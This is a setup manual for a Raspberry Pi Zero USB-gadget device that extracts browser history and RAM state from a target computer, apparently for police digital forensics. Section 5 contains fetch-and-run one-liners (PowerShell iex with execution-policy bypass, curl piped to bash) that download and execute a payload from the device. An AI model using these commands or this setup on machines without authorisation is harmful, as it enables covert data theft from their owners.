# S.E.I.Z.E. Setup & Operations Manual
### Swift Electronic Ingestion & Zero-delay Extraction Device
**Prepared for: Digital Forensics Unit, Nepal Police**

---

This document outlines the detailed setup, wiring, directory structure, and operational procedure for configuring:
1. The **Raspberry Pi Zero 2 W** as the field acquisition gateway.
2. The **Central Server Computer** as the secure evidence repository.

---

## 1. Hardware & Wiring Specification

Verify your physical connections between the **SSD1306 OLED Display Module** and the **Raspberry Pi Zero 2 W** using the Female-to-Female Dupont Jumper Wires.

| SSD1306 OLED Pin | Raspberry Pi Zero 2 W Pin (Header) | Description |
| :--- | :--- | :--- |
| **VCC** (Pin 1) | **Pin 1** (3.3V Power) | Power Supply |
| **GND** (Pin 9) | **Pin 9** (Ground) | Common Ground |
| **SDA** (Pin 3) | **Pin 3** (GPIO 2 - SDA) | I2C Data Line |
| **SCL** (Pin 5) | **Pin 5** (GPIO 3 - SCL) | I2C Clock Line |

---

## 2. Directory Structures

### A. Raspberry Pi Zero 2 W Layout
All execution files must reside under `/opt/seize/` on the Pi's filesystem:
```
/
├── opt/
│   └── seize/
│       ├── config/
│       │   ├── setup_gadget.sh      # USB OTG network emulation config
│       │   ├── dnsmasq.conf         # DHCP leases rules
│       │   ├── server_ip.txt        # Contains Central Server computer IP
│       │   └── interfaces.conf      # Network configuration references
│       ├── dashboard/
│       │   └── oled_dashboard.py    # OLED interface manager
│       └── server/
│           └── proxy_gate.py        # Gateway server that handles local uploads
└── data/
    └── seize_captures/              # Local cache if server computer is offline
```

### B. Central Server Computer Layout
Install these files on the forensic workstation/server computer:
```
C:\ (or /opt/ on Linux servers)
└── seize_captures/                  # Central repository for extracted folders
    ├── extraction_history.json      # Extraction log history registry
    ├── report_generator.py          # Builds PDF/HTML evidence reports
    └── [HOSTNAME]_[TIMESTAMP]/       # EXTRACTED FORENSIC FOLDERS
        ├── evidence_report.html     # Automated Court Report for the Judge
        ├── browsers/                # Chrome, Firefox, Edge history databases
        └── volatile_ram/            # RAM state dumped reports
```

---

## 3. Step-by-Step Installation on Raspberry Pi

Execute these steps on the Raspberry Pi Zero 2 W running **Raspberry Pi OS Lite 64-bit**.

### Step 3.1: Enable USB OTG (Gadget Mode)
1. Open `/boot/firmware/config.txt` (or `/boot/config.txt` on older OS versions):
   ```bash
   sudo nano /boot/firmware/config.txt
   ```
   Add the following line at the very bottom:
   ```text
   dtoverlay=dwc2
   ```
2. Open `/boot/firmware/cmdline.txt` (or `/boot/cmdline.txt` on older OS versions):
   ```bash
   sudo nano /boot/firmware/cmdline.txt
   ```
   Add `modules-load=dwc2,g_multi` immediately after `rootwait` (ensure all options remain on a **single line**, separated by spaces):
   ```text
   console=serial0,115200 console=tty1 root=PARTUUID=... rootwait modules-load=dwc2,g_multi quiet splash
   ```

### Step 3.2: Enable I2C Interface (for OLED Display)
1. Run configuration interface:
   ```bash
   sudo raspi-config
   ```
2. Navigate to: **Interface Options** -> **I2C**. Choose **Yes** to enable.
3. Exit and reboot.

### Step 3.3: Install System Dependencies & Python Libraries
After rebooting, execute:
```bash
sudo apt update
sudo apt install -y dnsmasq i2c-tools python3-pip python3-pil python3-flask python3-requests
sudo pip3 install luma.oled --break-system-packages
```

### Step 3.4: Copy Files to the Raspberry Pi
Create folders on the Pi:
```bash
sudo mkdir -p /opt/seize/config
sudo mkdir -p /opt/seize/dashboard
sudo mkdir -p /opt/seize/server
sudo mkdir -p /data/seize_captures
sudo chmod 777 /data/seize_captures
```

Move the project files from your workspace onto the Pi:
- Copy `config/setup_gadget.sh` to `/opt/seize/config/setup_gadget.sh`
- Copy `config/dnsmasq.conf` to `/opt/seize/config/dnsmasq.conf`
- Copy `dashboard/oled_dashboard.py` to `/opt/seize/dashboard/oled_dashboard.py`
- Copy `server/proxy_gate.py` to `/opt/seize/server/proxy_gate.py`

Make the gadget script executable:
```bash
sudo chmod +x /opt/seize/config/setup_gadget.sh
```

Define the Central Server computer's IP address:
```bash
# Replace 192.168.1.100 with the actual IP address of your Server computer
echo "192.168.1.100" | sudo tee /opt/seize/config/server_ip.txt
```

### Step 3.5: Configure Static IP on the Pi
Depending on your OS version, configure static IP `192.168.7.1` on the `usb0` interface:
*   **For Newer RPi OS (Bookworm):**
    ```bash
    sudo nano /etc/NetworkManager/system-connections/usb0.nmconnection
    ```
    Paste the following block:
    ```text
    [connection]
    id=usb0
    type=ethernet
    interface-name=usb0
    
    [ipv4]
    address1=192.168.7.1/24
    method=manual
    
    [ipv6]
    method=ignore
    ```
    Set strict configuration permissions:
    ```bash
    sudo chmod 600 /etc/NetworkManager/system-connections/usb0.nmconnection
    ```

### Step 3.6: Configure DHCP Server (dnsmasq)
```bash
sudo mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak
sudo cp /opt/seize/config/dnsmasq.conf /etc/dnsmasq.conf
```

### Step 3.7: Set Up Systemd Services for Automatic Start
Copy and install the daemon service profiles:
1. Copy the systemd config files:
   ```bash
   sudo cp /opt/seize/config/seize_server.service /etc/systemd/system/seize_server.service
   sudo cp /opt/seize/config/seize_oled.service /etc/systemd/system/seize_oled.service
   ```
2. Register the gadget script to run on boot in `/etc/rc.local` before `exit 0`:
   ```text
   /opt/seize/config/setup_gadget.sh
   ```
3. Reload and start the services:
   ```bash
   sudo systemctl daemon-reload
   sudo systemctl enable seize_server.service
   sudo systemctl enable seize_oled.service
   sudo systemctl start seize_server.service
   sudo systemctl start seize_oled.service
   ```
4. Reboot the Pi:
   ```bash
   sudo reboot
   ```

---

## 4. Step-by-Step Installation on Central Server Computer

You must configure the central receiver on your main server computer (Windows, macOS, or Linux).

### Option A: If your Server Computer is running Windows
1. Install **Python 3** (Ensure you check the box that says "Add Python to PATH" during installation).
2. Open PowerShell or Command Prompt as administrator and install Flask:
   ```cmd
   pip install flask
   ```
3. Create a directory on the server computer's `C:` drive named `C:\seize_captures`.
4. Copy the following files from your workspace onto the server computer:
   - Copy `server/central_server.py` to `C:\central_server.py`.
   - Copy `server/report_generator.py` to `C:\report_generator.py`.
5. Run the server using Command Prompt:
   ```cmd
   python C:\central_server.py
   ```
   *(Ensure your Windows Firewall allows inbound connections on Port 5000 so the Pi can connect to it)*.

### Option B: If your Server Computer is running Linux
1. Install dependencies:
   ```bash
   sudo apt update
   sudo apt install -y python3 python3-flask
   ```
2. Copy the files to your server directory (e.g. `/opt/seize/`):
   ```bash
   sudo mkdir -p /opt/seize
   # Copy central_server.py and report_generator.py to /opt/seize/
   ```
3. Run the central server daemon:
   ```bash
   python3 /opt/seize/central_server.py
   ```

---

## 5. Forensic Operation Instructions

### 1. Connecting the Device
1. Connect the Pi to your local Network (Wi-Fi or LAN) so it can communicate with the Central Server Computer.
2. Connect the Micro-USB data cable from the **USB OTG Port** of the Pi Zero to the target computer.

### 2. Executing the Extraction
On the target machine, execute the payload pointing to the Pi's gateway:
*   **On Windows (PowerShell):**
    ```powershell
    powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://192.168.7.1:5000/payloads/seize.ps1')"
    ```
*   **On Linux/macOS (Bash):**
    ```bash
    curl -s http://192.168.7.1:5000/payloads/seize.sh | bash
    ```

### 3. Monitoring Ingestion & Central Storage
The OLED dashboard on the Pi updates:
- **State: CONNECTED** -> **EXTRACTING** -> **SAVING**
- Once transmission completes:
  - If the Central Server is online, the screen displays: `SYNCED TO CENTRAL SERVER`. The zip is uploaded, extracted unencrypted, and the PDF/HTML Evidence Report is automatically generated on your server computer under `C:\seize_captures`.
  - If the Central Server is offline/unreachable, the screen displays: `CACHED LOCALLY (OFFLINE)`. The extraction remains stored locally on the Pi's SD card until connection is restored.
